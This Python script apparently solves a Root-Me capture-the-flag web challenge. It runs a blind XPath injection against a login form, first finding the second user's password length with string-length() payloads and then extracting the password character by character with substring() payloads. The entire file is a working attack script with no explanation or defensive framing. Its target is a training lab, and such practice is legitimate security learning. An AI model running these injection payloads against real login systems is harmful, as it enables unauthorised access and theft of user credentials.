import requests
import string

url = "http://challenge01.root-me.org/web-serveur/ch23/?action=login"

print("----------------------------- 1- get the len of the password -----------------------------")
lenPass = 0

for l in range(30):
    payload = "' or string-length(//user[position()=2]/password/text())='{}".format(l)
    data = {"username": payload, "password": payload}
    r = requests.post(url, data=data)
    if "Wrong" not in r.text:
        print("**** length found **** : {}".format(l))
        lenPass = l
        break
    else:
        print("=> Wrong length : {}".format(l))

print("----------------------------- 2- get the password -----------------------------")

nextChar = 1
password = ""
while nextChar <= lenPass:
    for c in string.printable:
        payload = "' or substring((//user[position()=2]/password/text()),{0},1)='{1}".format(nextChar, c)
        data = {"username": payload, "password": payload}
        r = requests.post(url, data=data)
        if "Wrong" not in r.text:
            password += c
            print("**** char found **** : {}".format(password))
            lenPass = l
            break
        else:
            print("=> Wrong char : {}".format(c))
    nextChar += 1

print("the flag is : {}".format(password))
